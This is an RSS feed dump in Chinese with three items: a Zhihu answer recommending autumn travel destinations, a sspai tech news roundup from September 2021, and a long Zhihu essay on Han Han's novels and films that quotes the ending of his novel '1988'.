[{"title":"国内有哪些在秋季值得一去的地方？","date":"2021-09-07 03:37:15","description":"\n<p>活动测试，一会删~</p>\n<p>几个不错的选择：</p>\n<p>北京：今年来北京不仅可以欣赏到香山红叶，日坛银杏，预算充足的朋友还可以去环球影城，但是可以预想到人山人海。</p>\n<p>此外推荐莫干山，莫干山位于浙江省湖州市德清县，海拔758米。素有“清凉世界”的美誉，莫干山的中心景区，包括塔山、中华山、金家山、屋脊山、莫干岭、炮台山等。遍山竹海，流泉飞瀑无处不见，更有挺拔参天的日本冷杉及宋代银杏。</p>\n<p>第三呢，贵州，如果你看过毕赣的「路边野餐」一定知道凯里。所以这次推荐凯里，如果去凯里酸汤鱼是一定要尝一尝的。</p>\n<p>酸笋鸡其实不算是凯里特色，属于贵州特色菜，贵州菜的最大特点就是酸和辣。这当时是有历史原因的，因为黔东南地区严重缺盐，只得用酸与辣来调味。活用香料调料倒也成就了了贵州菜。</p>\n<p>假期出行，注意安全~ 希望大家旅行愉快。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/nuo-mi-24-46?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">yuri</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/479232905/answer/2107407377?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">31 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/49069808?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">计划九月份想去新疆旅行，为期半个月至一个月。求攻略，熟悉情况的老司机们，请伸出援手吧？</a><br><a href=\"http://www.zhihu.com/question/420263747?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">十一黄金周想去新疆玩，有什么地方推荐么？</a><br>\n","link":"http://www.zhihu.com/question/479232905/answer/2107407377?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"派早报：vivo 发布首款自研专业影像芯片 vivo V1、腾讯红魔 6S Pro 正式发布等","date":"2021-09-07 00:52:49","description":"\n<h2>你可能错过的新鲜事</h2>\n<h3>vivo 发布首款自研专业影像芯片 vivo V1</h3>\n<p>9 月 6 日，vivo 在深圳召开「芯之所像」主题影像技术分享会，传闻已久的 vivo V1 芯片正式亮相。vivo 表示，V1 作为一款全定制的集成芯片，与主芯片协作可以降低硬件电路功耗达 50%，成像速度亦有显著提升，可以实现夜景实时预览成片。此外，vivo 同时公布了超高透玻璃镜片、全新镀膜工艺、蔡司自然色彩等影像技术新成果。</p>\n<p>搭载 vivo V1 的首款产品 vivo X70 系列将于 9 月 9 日正式亮相。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4rbbotb34t893up9dk0.png\"></figure><h3>腾讯红魔 6S Pro 正式发布</h3>\n<p>9 月 6 日，腾讯红魔 6S Pro 游戏手机正式发布，该设备配备 165Hz 的 6.8 寸 AMOLED 显示屏，支持 10-bit 色彩以及 DC 调光。搭载高通骁龙 888+ 处理器，并搭配正二十一烷 C21H44 相变散热材料以及 20,000RPM 散热风扇。在续航方面，设备内置了 4500mAh 大容量电池，并支持 120W GaN 有线快充。红魔 6S Pro 本次会推出 3 种配色方案以及四种配置组合，售价 3999 元起。<a href=\"https://m.nubia.com/active/reserve.html\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4rbbpdb34t8amojc9gg.jpeg\"></figure><h3>Redmi Buds 3 真无线耳机发布</h3>\n<p>9 月 6 日，Redmi 红米手机官方发布微博，正式宣布 Redmi Buds 3 真无线耳机开始众筹，该无线耳机采用了半入耳式人体工学设计，单耳重量 4.5 克。搭载高通 QCC3040 芯片，并配有 12mm 复合振膜大动圈。续航方面，单次续航可达 5 小时，配合充电盒可达 20 小时。将于明日正式开启众筹，众筹价格 159 元。<a href=\"https://weibo.com/3021514657/KwSK1E5jd\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4rbbpdb34t897udgh10.jpeg\"></figure><h3>宝马推出 i Vision AMBY 电动自行车</h3>\n<p>宝马于 2021 慕尼黑车展上正式发布一款名为 i Vision AMBY 的电动自行车，该款电动自行车提供 25 km/h、45 km/h、60 km/h 三种配速，并且会根据地理围栏确认自行车位置并自动调整速度。和一般意义上的电动自行车有所不同，i Vision AMBY 虽然提供了 2000Wh 的电池，可以提供高达 300 公里的续航，但依旧需要踩蹬来前进，同时提供了多项安全功能，例如 ABS 系统、自动远光灯辅助、刹车灯辅助系统、日间骑行灯以及一个远距离传感器。<a href=\"https://www.ithome.com/0/573/762.htm\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4rbbptb34t897udgh1g.jpeg\"></figure><h3>Pixel 3 与 3 XL 大量出现「变砖」bug</h3>\n<p>近期，大批 Pixel 3 与 3 XL 用户报告称手机突然无法启动系统，并进入紧急下载（EDL）模式。该界面为高通芯片的恢复模式。值得一提的是，目前绝大多数 Pixel 3 与 3 XL 都超过了保修期限。Google 目前尚未对此做出回复。<a href=\"https://arstechnica.com/gadgets/2021/09/reports-of-pixel-3s-bricking-with-edl-message-are-growing/\" target=\"_blank\">来源</a></p>\n<h2>看看就行的小道消息</h2>\n<ul>\n<li>Apple 在最近给 FCC 提交的文件中新加入了一个新款的 MagSafe 充电器，型号标识为 A2548（当前版本标识为 A2140），并且 FCC 还为此测试了四款新 iPhone，可能暗示 iPhone 13 将会有四款机型，此前有消息称 iPhone 13 将会配备更强的磁体阵列来支持 MagSafe。<a href=\"https://9to5mac.com/2021/09/06/apple-fcc-filings-reveal-revised-magsafe-charger-ahead-of-iphone-13-event/\" target=\"_blank\">来源</a>\n</li>\n<li>OPPO 发布 ColorOS 预热微博，可能于今日公布 ColorOS 12。<a href=\"https://weibo.com/3402761920/KwTwFrGFe\" target=\"_blank\">来源</a>\n</li>\n<li>英特尔新一代的 Alder Lake 系列 CPU 欧美地区定价被零售商意外泄露，各型号售价均有提高，旗舰处理器涨幅接近 100 美元/200 欧元。<a href=\"https://www.ithome.com/0/573/735.htm\" target=\"_blank\">来源</a>\n</li>\n</ul>\n<h2>少数派的近期动态</h2>\n<ul>\n<li>📓 少数派会员通讯《<a href=\"https://sspai.com/prime/precog/vol07-pre-talk-about-notes\" target=\"_blank\">笔记大战</a>》已经上线，来看看他们的笔记工具方法论吧！</li>\n<li>🎁 会员周边将于即日起<strong>陆续</strong>发货，敬请期待。</li>\n<li>🎉 少数派正版软件商城 <a href=\"https://sspai.com/mall/discount/%E5%BC%80%E5%AD%A6%E5%AD%A3%E4%BF%83%E9%94%80\" target=\"_blank\">开学季促销</a> 开启，数十款优质软件低至 5 折起。</li>\n<li>📡 你会在日常生活中使用 5G 网络吗？去 <a href=\"https://sspai.com/bullet/1628500218\" target=\"_blank\">一派</a> 和大家聊聊。</li>\n<li>📕 由少数派编辑部联合优秀作者出版实体书《数字时代的效率手册》上线电商平台，立即前往 <a href=\"https://item.jd.com/12914331.html\" target=\"_blank\">5 折下单</a>。</li>\n</ul>\n<h2>你可能错过的文章</h2>\n<ul>\n<li>🤖 <a href=\"https://sspai.com/post/68578\" target=\"_blank\">手把手教你用飞书 Webhook 打造一个消息推送 Bot</a>\n</li>\n<li>🏠 <a href=\"https://sspai.com/post/68454\" target=\"_blank\">2000 块钱，在广州租下并鼓捣一个可以装进梦想的家丨下</a>\n</li>\n<li>🖱️ <a href=\"https://sspai.com/post/68599\" target=\"_blank\">办公室与宿舍的防刺杀装备：静音键鼠详解</a>\n</li>\n<li>⭐️ <a href=\"https://sspai.com/post/68624\" target=\"_blank\">派评 | 近期值得关注的 App</a>\n</li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p> </p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68628"},{"title":"有哪部作品没有被影视化，让你觉得「也太遗憾了」？","date":"2021-09-06 12:56:17","description":"\n<p>稍微谈几句个人的喜好。</p>\n<p>韩寒的《1988我想和这个世界谈谈》，是我个人最希望看到的影视改编作品。但与此同时，它的影视化改编难度之大，也是完全可以事先料想的。</p>\n<p>韩寒的小说，带有极其鲜明的个人特色。大家往往会将他归类于两极化的存在：少年时代的叛逆者，成熟时期的精明鬼。这很大程度上来自于韩寒自身对外行为的改变：他打破了曾经“不接广告，不参加娱乐节目”等誓言，开始做广告、拍电影、上节目，更多地营销包装自己，并且在商业上取得了更大的成功。</p>\n<p>在外界看来，曾经的反抗性，似乎变成了一种妥协；曾经的特立独行，似乎也变成了对于某一自认为小众实则大众的“不想庸俗”之庸俗群体的定向讨好。个性变成了人设，创作变成了粉丝消费，他与郭敬明的区别也变成了“精准定位”的不同，同为粉丝经济友军的差异化竞争。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-07056e0bbf550cfcef481a3fdc56fedc_720w.jpg?rss\" data-rawwidth=\"500\" data-rawheight=\"309\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-07056e0bbf550cfcef481a3fdc56fedc\" data-watermark-src=\"v2-e00fc2187c4879e8ef537264774b2fcc\" data-private-watermark-src=\"v2-22d33649c4be924b8231ea051d12b3d3\"></p>\n<p>韩寒变了吗？深入社会、经验增长、结婚生子，当然会让他有所改变，从一个颇为极端的愤怒青年，变成了更了解、接受现有社会规则之合理性的成年人。但事实上，他也没有什么改变，对于创作风格、审美品味、个人思想的坚持，始终是他没有抛弃的部分。</p>\n<p>从他一系列的小说中，我们可以清晰地感受到这一点。《三重门》等早期作品，固然讽刺，但更多停留在了对现象的提出，以及动用大量篇幅对嘲弄讥笑、甚至夸大化之上。这与他当时期的杂文博客创作也很类似：指出摆在明面上、但其他人不便或不敢指出的现象，进行单刀直入的反对。</p>\n<p>如此一来，小说的文笔才思、杂文的揭露勇气、固然值得赞扬，但却无一例外地缺少深度和思考，仿佛自认犀利的青春期少年的扬鞭痛斥，痛快过瘾，但无更多实际意义，甚至有几分自鸣得意的卖弄。就像韩寒自己所说：《三重门》那些书，过于想在每一段都出彩，实际上没什么内容。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-192b09b308d0fc2c1b7fdce26fbd5d0f_720w.jpg?rss\" data-rawwidth=\"600\" data-rawheight=\"868\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-192b09b308d0fc2c1b7fdce26fbd5d0f\" data-watermark-src=\"v2-2aed7d6e9e8b26abe941750de3ffcd06\" data-private-watermark-src=\"v2-5b7e6128154ac0720416f2166f9a0bd8\"></p>\n<p>而他后期的作品，则逐渐开始体现出他深入社会、走过人生更多历程后的状态。刻意的单句搞笑少了，玩笑段子更多地拥有了一个共同的指向：对于残酷世界与冰冷现实的自嘲、开解。像《一座城池》《像少年啦飞驰》这样的作品之中，韩寒反复地开着主角们在落魄情境下的玩笑，让他们的回应成为笑点，人物面对窘境的头铁、死硬、自损，透露出对于世界的不妥协与不绝望。而其结局，往往像韩寒被人诟病的那样，“戛然而止，无结尾的结尾”，从而表现出一种理想主义的终焉——一直坚持，但无法实现。</p>\n<p>他们并没有激进地反抗，但也从未在这种情况下投降。《一座城池》中的主角们，似乎放任自流、混沌度日，但却有着一股自己的别样“坚持”——最具有象征意义的片段里，主角之一身残志坚，用近乎乌龟爬的速度，缓缓地向心仪的姑娘移动，然而对方却已经离去。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-dc584fc2db3305daffcc55f194da3582_720w.jpg?rss\" data-rawwidth=\"980\" data-rawheight=\"551\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-dc584fc2db3305daffcc55f194da3582\" data-watermark-src=\"v2-0455e4d7c4f3f0f64a546fb0fcec7475\" data-private-watermark-src=\"v2-aae821c4bbf2eb4bd7dadb1ba242f777\"></p>\n<p>事实上，这也正是韩寒本人在当下对待世界的态度：他理解世界运行的规则之必然性，也愿意为了各种客观需求而放下曾经的自我，承认原来极端思想的幼稚，但是，他并不想放弃所有的内心坚持，不想被社会系统彻底同化，涂染成一个完全无法分辨面目的无个性存在。在游戏规则中，保留自我，像与他多少有点类似的姜文那样，“站着把钱挣了”，是他的追求。</p>\n<p>一个承认现实残酷，打压理想，但依然试图在规则里实现它的理想主义者，或许就是当前这批作品中表现出的韩寒。他当然有在试图经营自己的“文艺形象”，获得相关受众，但却并不想完全满足于此：他的作品，永远都有着类似的晦暗难懂、不明所以，但也从未打破搞笑与冰冷、黑暗与宽慰兼容混合的整体风格，更由此在作品世界中延续了一种异样的“脱离俗世感”。</p>\n<p>这当然会让他的一部分受众满意，但也必然会招致另一部分受众在不明所以之下的“被降维打击”挫败感，同时也不利于更广大人群的普及。韩寒的坚持，或许可以理解为：在满足尽量多受众的同时，输出我自己风格与表达的内容，以内容而非单纯的包装去契合受众，而非只做样子地宣传诱骗。《让子弹飞》中的姜文，恰恰也正是实现了这一点。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-3e55099cc0c4c07d07e1df76cea927bf_720w.jpg?rss\" data-rawwidth=\"440\" data-rawheight=\"260\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-3e55099cc0c4c07d07e1df76cea927bf\" data-watermark-src=\"v2-a2e4071b2c7d8edabaa75b918923e1e1\" data-private-watermark-src=\"v2-23a44e90ac53b24ae1e87d45a62e794f\"></p>\n<p>而如果我们放大到电影创作，则可以看到韩寒的更多信息。他的所有电影，都与小说创作一脉相承，但又没有局限于此。</p>\n<p>处女作《后会无期》，被评为最“韩寒小说”的散乱式电影，堆梗问题饱受诟病。但是，于整片而言，我们显然可以看到“梗”与“片段”之间的内在有机结合表达。</p>\n<p>在这部电影里，从三段男女之情到伪装的骗子钟，韩寒都在表现着现实法则对个人理想主义情怀的压制。理想化的江河，被马浩瀚一次次打击教育，更在突生纯爱之情的妓女王珞丹面前，因为警察的扫黄而仓皇逃窜。赴边教书的理想信仰，更是在路途上屡受阻碍，甚至遭遇汽车故障的吃瘪。而相对现实化的马浩瀚，却也同样无法做到自己“我在哪儿擦屁股，都有人给我送纸”的“吃得开”，反而在“号称演员，实则路人甲”的陈乔恩面前难以张开借钱的嘴，在“暗恋我”的袁泉面前发现自己完全误会、实属兄妹，甚至难以开口表白。</p>\n<p>而最撕破理想化的，便是钟汉良的骗子钟与一同出发的傻小子了。骗子钟以最理想主义的面目出现，声称自己想要追看极光，实际上却只是再现实不过的诈骗钱财。而相对地，傻小子的傻，透露着心地的纯真、未被现实改变的原初，但却像韩寒小说里的很多角色一样，突兀消失。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-f000603ccb9d3a061c00560d508e6ae5_720w.jpg?rss\" data-rawwidth=\"2592\" data-rawheight=\"1456\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-f000603ccb9d3a061c00560d508e6ae5\" data-watermark-src=\"v2-53a0b0b6dce0f3721be22ce5469035f8\" data-private-watermark-src=\"v2-2d2a9068082cd31360d869a6590e5b7f\"></p>\n<p>当然，韩寒在少年期曾经以“其实我就是写忘了”为解释，但这是否只是他的故作对抗嘲讽之言？至少，以现在的成熟韩寒而言，他不太可能再在一部不可能忘记要素的电影里“拍丢了”。这其中当然有所表达——他们从对外隔绝、自给自足的东极岛出发，离开即将被外部世界入侵、染色的岛屿，去往另一片江河口中的理想化世外桃源，怀着东极岛而生的理想主义，但路途上一系列的挫折打击教育，却让他们的理想逐渐磨灭，而先天缺陷、至真至纯的傻小子早早的突然消失，便是对后续一切的提前预示：理想，哪怕纯洁完美，也赢不了现实化之路的打压。</p>\n<p>甚至，骗子钟的突兀出现，与傻小子的突兀消失，一前一后。这个巧妙的设计，似乎有了一种“同一角色进化改变”的意味：至纯理想的傻小子，在我们看不到的现实世界中游荡，思想彻底改头换面，成为了骗子钟。而电影在现实层面的明确结局部分里，并没有正面呈现江河路途的尽头——那个他梦寐以求的理想王国，与世隔绝的荒野戈壁，物质的贫瘠地与信仰的伊甸园，是否真正存在，是否是他梦想中的样子，他又是否抵达，无人得知。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-78b38dc19c74842e7d45f081cf7aeb40_720w.jpg?rss\" data-rawwidth=\"698\" data-rawheight=\"433\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-78b38dc19c74842e7d45f081cf7aeb40\" data-watermark-src=\"v2-bbd8c743a43aaa1812ebcb94006b1d57\" data-private-watermark-src=\"v2-42ba27f86d9da75b9e30cf04268f01bc\"></p>\n<p>这不禁让人想起了韩寒推荐、方励投资的《家在水草丰茂的地方》——两个少数民族少年，从放牧文化消亡的黄沙之地出发，奔向父辈所在的草原深处，那未被当代化的水草丰茂之地，在一路上重温了宗教的信仰，仿佛即将回到心灵之所，然而在最后一个镜头中，迎接他们的，却只是工业烟霭升腾、行将荒漠化的半秃草原，以及被雇佣工作的父辈。而《后会无期》中的江河，是否也经历了同样的事情呢？</p>\n<p>但是，在每一段中，韩寒却又都留下了理想主义并未泯灭的希望火种。群众演员陈乔恩闲适地走过民国布景，微微仰头之间，美艳不可方物，光芒汇聚于她的脸上，仿佛她此刻便是绝对主角。因为血缘关系，被迫拒绝冯绍峰的袁泉，留下了“喜欢是放肆，而爱是克制”的别样表白，既点出了血缘的现实不可越鸿沟，也在主观上承认了她的感情。王珞丹逃离扫黄警察时，在一片星光和灯火的辉映中优雅散步，这一刻她与江河仿佛真地进入了心灵交互的纯美世界，且不再是迫于生计、仓皇逃命的苦命人。这一切表达，延伸到了高潮：作为理想主义寄托的卫星，发射升空，震撼众人。</p>\n<p>这些梦想实现、压过现实的理想主义瞬间，其实都只是电影段落中的倏忽即逝。试位的陈乔恩马上被导演叫了下去，换女主角上场。袁泉说完表白，与马浩瀚再无交集。王珞丹被贾樟柯带上车，江河被提醒“你知道她是干什么的吧”，然而，这却并不影响这些瞬间的圣洁高贵——现实是不可撼动的，但认清这一事实，也并不意味着理想在心中的消亡。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-c3b1fb0cde63290e81750c7ec6a6a90c_720w.jpg?rss\" data-rawwidth=\"658\" data-rawheight=\"921\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-c3b1fb0cde63290e81750c7ec6a6a90c\" data-watermark-src=\"v2-4b69cf4563a717109df1c2740162a362\" data-private-watermark-src=\"v2-4917e48826b8970588f1d21722c79252\"></p>\n<p>而在结尾，韩寒模糊掉了现实与非现实的边界，在一个似现实、却又过于梦幻的世界中，宣示了理想主义者江河的成功，让一片暖色调光晕中的东极岛重回原初，而江河则徜徉于其中。并且，韩寒也让相对的现实主义者马浩瀚，在结尾念出他为江河的书写的文艺序言，让马浩瀚与江河的心灵构成了“呼应回响”---被现实压倒的马浩瀚，同样怀有理想主义。这个结尾，让理想主义得到了再一次的宣扬。哪怕它分明是非现实的遐想，但却切实地存在于每个人——认清现实力量的人——的脑海之中，不可抹除。</p>\n<p>而在韩寒后续的电影作品里，这样的主题与氛围，基本上得到了通贯到底的执行延续。《乘风破浪》中，赛车手回到了过去，但开解他与父亲心结的，却不是他对于父亲潜在苦心的了解，也自然不是随之而生的自我改变，而是他从父亲身上感受的坚持信心，反而坚定了原本的理想信念。他曾经不理解的是父亲为何任性妄为入狱而没有照顾好母亲，但在穿越之中，他触摸到了父亲性格中的积极一面，也随之逐渐了解了对于原初自我的坚持。母亲爱上的正是这样一个父亲，父亲也从未改变照顾兄弟的义气性格，否则爱情根本无从开始。</p>\n<p>而在结尾，胆怯的小马成为了“马化腾”，更是完美的点题——各人的自我都是不必“优化改变”的自我，各有归宿，各自安好，各生欢喜。而赛车手与父亲的和解，也恰恰来自于此：他对于赛车不顾反对的坚持，让同样坚持自己的父亲感到了共鸣，于是他与父亲在“父亲不改变”的母亲身亡上和解，父亲则与他在“他不改变”的赛车职业上和解。哪怕，周遭的现实，是冷酷的亲人离世、未明的事业远景。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-695c31fb8f0e2af8b1861bb72c7ea707_720w.jpg?rss\" data-rawwidth=\"2500\" data-rawheight=\"1875\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-695c31fb8f0e2af8b1861bb72c7ea707\" data-watermark-src=\"v2-0e94c4ac1b6ac7f4172ca9c5eec327b6\" data-private-watermark-src=\"v2-6c7c9a54c4dce0fc087633f2488a51c1\"></p>\n<p>而《飞驰人生》的结尾来临时，熟悉的气息也再次扑面而来。韩寒依旧是韩寒，他对理想主义的宣扬、对“现实不能让我屈服”的精神胜利的赞许，仍然创造了一个效果上佳的高潮。主角的车飞上高空，完成了主角梦寐以求的“飞驰”，而他也赢得了比赛，实现了自己的理想，即使在现实层面上等待他的将是车毁人亡。他并非不知道现实的模样，在闪回的交代中可以看到，他早就感受到了世态炎凉，否则也不会说出“我们的时代已经过去了，对吧年轻人”这样的话。但是即使如此，他依然认为“靠纯粹的热爱，才能赢得比赛”，与其说他认为这能带他走向现实层面的成功，不如说他从心里不愿意改变。</p>\n<p>结尾的飞机和动画，是张弛儿子的想象或者是回忆，深层次来说，则是张驰“用热爱来赢得一切”的理想主义在精神层面的胜利。但是，在现实层面上，张驰一定是车毁人亡了的。这种车毁人亡，实际上也代表着他的理想主义在现实层面的必然结局。这在此前的电影中，也已经有所展示：张驰是在几乎融不到资，拿不到好车的情况下，用自己的热情和理想强行支撑，从而勉强达到了比赛的资格。</p>\n<p>与其说他战胜了现实，不如说是他在被现实打败这一必然结局下的最后燃烧。但是，电影将他的身影停留在了飞上天空的一瞬，仿佛他真正摆脱了物质的世俗纠缠打压，获得了理想腾飞的自由。这种混合着现实打压与理想升腾的信息，正是韩寒的母题——认清现实，但依然坚守理想，并歌颂这种坚守。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-e968928647ae14c7ce9d1f85369a46b5_720w.jpg?rss\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-e968928647ae14c7ce9d1f85369a46b5\" data-watermark-src=\"v2-f366571883336ab7c0ad04ffff36ec81\" data-private-watermark-src=\"v2-e0ebb906473dee1669befaa29e8594b7\"></p>\n<p>由此可见，韩寒的创作，拥有一个高度个性、且在电影创作中愈发圆润老练的表达主题。这也与他本人在现实中的作风保持着一致：接受包装与营销，却不在内容上含糊，坚持自己的独特风格，保持技巧的学习，但却不改变散化结构、段子玩梗，更不会修改意境氛围；而在生活中，他更是多面的，社交玩转的同时，又有着明显无法得到大众认同的极度自由爱情观、以及相对应的“对责任感的认知”。</p>\n<p>他无疑是高度个人化、作者性的创作者，也完全有能力、有意愿用作品来表达自我。这让韩寒的作品有了丰富的独特性——腔调、意境、情绪、节奏、结构、叙述、母题。</p>\n<p>而这也正是《1988 我想和这个世界谈谈》，最期待被影视化的核心理由。</p>\n<p>韩寒的文学作品并不少，但对他脑海中的一切实现度最完美、完成度最高分的，或许就是这部作品了。单以结尾的处理而论，我们就能看到这一点。</p>\n<p>此前，韩寒多采取戛然而止的方式。像《一座城池》里，便让那座脱离现实感、人们行为逻辑诡异的“理想王国”爆炸，并且让男主角感到背后抱上的手，听到那句“你是害怕了吗，还是别的什么”，终于接收到爱情的宽慰，让理想的破灭与再萌芽交织，而后突兀砍断故事，将一切停留在这里。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-c8d1e2a7a3fb50b653985085765af520_720w.jpg?rss\" data-rawwidth=\"699\" data-rawheight=\"512\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-c8d1e2a7a3fb50b653985085765af520\" data-watermark-src=\"v2-085e959fcbaaedea881d4a4fa646da2d\" data-private-watermark-src=\"v2-c1d97d991ef0e7a610d9b1c3374122a8\"></p>\n<p>而《1988》，却有所不同。我们能看到一个非常完整的结尾，让一切线索收归一处，完成交代：女主角妓女的下落，以及开篇中提出的“接朋友”之剧情主线（类比《后会无期》里江河等人的“前往支教”），都有了确切的承接收束。同时，情感的表达上，韩寒也给出了一个绝对意义上的全篇制高点，以情绪和主题的双重升华，结束作品。</p>\n<p>可以说，《1988》中的韩寒，难得地在小说的范畴里，找到了实现自我创作构想的高完成度途径，而不再只是灵感断裂一般的草草收场。在本作中，我们几乎可以找到一切韩寒标志性的东西，甚至清晰地看到一些《后会无期》的痕迹——妓女的浪漫，明确的“出发前往某目的地”的主线动机。而且，它们以一种极其紧密且明确的方式，结合到了一起。这让它的电影改编难度，必然低于评分极低的《一座城池》与《长安乱》。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-04a69e533f9cbee933d0442ce61e3a0f_720w.jpg?rss\" data-rawwidth=\"640\" data-rawheight=\"427\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-04a69e533f9cbee933d0442ce61e3a0f\" data-watermark-src=\"v2-339da41f81c36c9b39500b0f5a0c9501\" data-private-watermark-src=\"v2-609be030210f64b4d9cf3cc4473b2fdc\"></p>\n<p>以下，是这部小说的结尾，至少个人而言，是让人只能全部黏贴转载之程度的优秀，无法被缩写、简述、概论。</p>\n<p><i>我带着一个属于全世界的孩子上路了。站在我故乡那条国道尽头的友谊桥上，在稀薄的空气里，从凌晨开始等待，我从不凝望过往的每一台汽车。1988的点烟器烧坏了，我向一个路过的司机借了火，但我不想在这个时刻再和任何陌生人言语，所以我只能一支接着一支抽烟，那火光才不会断去。自然的，我站在车外。几个小时后，香火终于断了，我俯身进车，捏了一把小家伙的脸说，我找找烟。打开了汽车的扶手箱，我掏到了在最深处的一个小玩意，取出来发现那是一只录音笔，我搜寻记忆，才想起那是娜娜扔在这台车里的。它躺在这里面已经两年，我按下播放键，居然还有闪烁着的最后一格电，娜娜轻唱着摇篮曲，我不知道是不是空气越稀薄，声音便传越远，还是空气稀薄的地方一定没有人烟和喧闹，我总觉得这轻微的声音在山谷里来回飘荡，我将录音笔拿起来，放在小女孩耳边，说，你妈。她兴奋地乱抓，突然间，歌声戛然而止，传来三下轻促的敲击化妆台的声音，然后是另外一个女声说道，娜娜，接客了。在娜娜回着哦的同时，这段录音结束了。我连忙抽回录音笔，观察着小家伙的表情，她似乎有所察觉，放下了小爪子疑惑地看着我。我将录音内容倒回到被中断前的最后一声歌声，然后按下录音键，摇下窗户，我想山谷里的风雨声可以洗掉那些对话，覆盖了十多秒以后，我把手从窗外抽了回来，刚要按下结束，小家伙突然对着录音笔喊了一声“咦”，然后录音笔自己没电了。这是她第一次正儿八经说话，我曾一度害怕她不能言语。这第一声，她既不喊爸爸，也未喊妈妈，只是对着这个世界抛下了一个疑问。</i></p>\n<p><i>天将黑的时候，我发动了1988，掉转车头，向东而去，如果它能够不抛锚，那么我离开海岸线还有五千公里。如果它抛锚了，那么海岸线离开我还有五千公里。也许我会在那里结识一个姑娘，有一段美好的时光。那会是一个全新的地方。但我至少等待过，我知道你从不会来，但我从不怀疑你彼时的真心，就如同我的每一个谎言都是真心的。但这一次，我至少是勇敢的，我承认的朋友们也会赞许我的行为，因为他们都会是这样的人，你也许会为我流泪，但也许心中会说，你太蠢了。</i></p>\n<p><i>天全黑的时候，我停下了1988，小家伙正在熟睡，今天她居然没有哭泣。我从后座拿出了一个袋子，里面便是1988制造者的骨灰，在我心中，里面还有丁丁哥哥，10号，刘茵茵，我将他们撒在了风里。马上我知道了迎风撒东西是多傻的事，我身上沾满了他们的骨灰。我拍了拍衣服，想那又如何，反正我也是被他们笼罩着的人，他们先行，我替他们收拾着因为跑太快从口袋里跌落的扑克牌，我始终跑在他们划破的气流里，不过我也不曾觉得风阻会减小一些，只是他们替我撞过了每一堵我可能要撞的高墙，摔落了每一道我可能要落进的沟壑，然后告诉我，这条路没有错，继续前行吧，但是你已经用掉了一次帮助的机会，再见了朋友。</i></p>\n<p><img src=\"https://pic1.zhimg.com/v2-a7f8d5aa329a17a7c2229f552f27aa3c_720w.jpg?rss\" data-rawwidth=\"440\" data-rawheight=\"415\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-a7f8d5aa329a17a7c2229f552f27aa3c\" data-watermark-src=\"v2-321dfd71e7721ebde6978564c1fa26b6\" 